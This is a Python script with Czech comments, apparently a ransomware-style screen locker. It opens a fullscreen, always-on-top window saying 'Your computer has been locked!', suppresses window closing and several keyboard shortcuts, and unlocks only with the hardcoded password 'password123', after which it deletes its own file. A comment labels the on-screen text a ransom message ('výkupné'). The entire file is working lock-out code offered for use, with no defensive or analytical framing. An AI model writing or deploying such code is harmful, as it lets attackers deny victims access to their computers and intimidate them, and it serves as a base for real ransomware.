import tkinter as tk
from tkinter import messagebox
import os
import sys
from pynput import keyboard

# Nastavení hesla
PASSWORD = "password123"

def block_shortcuts():
    """Blokuje klávesové zkratky jako Alt+F4, Ctrl+Alt+Delete, klávesu Windows, atd."""

    def on_press(key):
        """Zablokuje určité klávesy a klávesové zkratky."""
        try:
            # Zablokuje klávesy jako Alt, F4, klávesu Windows a Ctrl+Alt+Delete
            if key == keyboard.Key.alt_l or key == keyboard.Key.f4 or key == keyboard.Key.cmd or key == keyboard.Key.ctrl_l or key == keyboard.Key.delete:
                return False
        except AttributeError:
            pass
        return True

    # Nastaví listener pro klávesy
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def lock_screen():
    """Zamkne obrazovku a umožní odemčení pouze se správným heslem."""
    def check_password():
        """Ověří, zda je zadané heslo správné."""
        entered_password = password_entry.get()
        if entered_password == PASSWORD:
            messagebox.showinfo("Unlock", "Password is correct! Unlocking...")
            root.destroy()
            os.remove(__file__)  # Odstraní tento skript
            sys.exit()
        else:
            messagebox.showerror("Error", "Incorrect password. Try again.")
            password_entry.delete(0, tk.END)  # Vyčistí vstupní pole

    # Nastavení hlavního okna
    root = tk.Tk()
    root.attributes("-fullscreen", True)  # Celoobrazovkový režim
    root.attributes("-topmost", True)     # Okno bude vždy nahoře
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Zakáže Alt+F4
    root.configure(bg='black')

    # Zpráva o výkupném
    label = tk.Label(root, text="Your computer has been locked!\nEnter the password to unlock.", fg="red", bg="black", font=("Helvetica", 36))
    label.pack(pady=20)

    # Vstupní pole pro heslo
    password_entry = tk.Entry(root, show='*', font=("Helvetica", 24))
    password_entry.pack(pady=20)
    password_entry.bind('<Return>', lambda event: check_password())  # Povolit enter pro kontrolu hesla

    # Tlačítko pro odemčení
    unlock_button = tk.Button(root, text="Unlock", command=check_password, font=("Helvetica", 24))
    unlock_button.pack(pady=20)

    # Zabrání minimalizaci okna a jiným interakcím
    root.bind_all("<Alt-KeyPress-Tab>", lambda e: "break")  # Blokuje Alt+Tab
    root.bind_all("<Control-KeyPress-Escape>", lambda e: "break")  # Blokuje Ctrl+Esc
    root.bind_all("<Command-KeyPress-Q>", lambda e: "break")  # Blokuje Cmd+Q na macOS
    root.bind_all("<Button-1>", lambda e: None)  # Ignoruje kliknutí myší
    root.bind_all("<Key>", lambda e: None)  # Ignoruje klávesové vstupy

    block_shortcuts()  # Zablokuje klávesové zkratky
    root.mainloop()

if __name__ == "__main__":
    lock_screen()
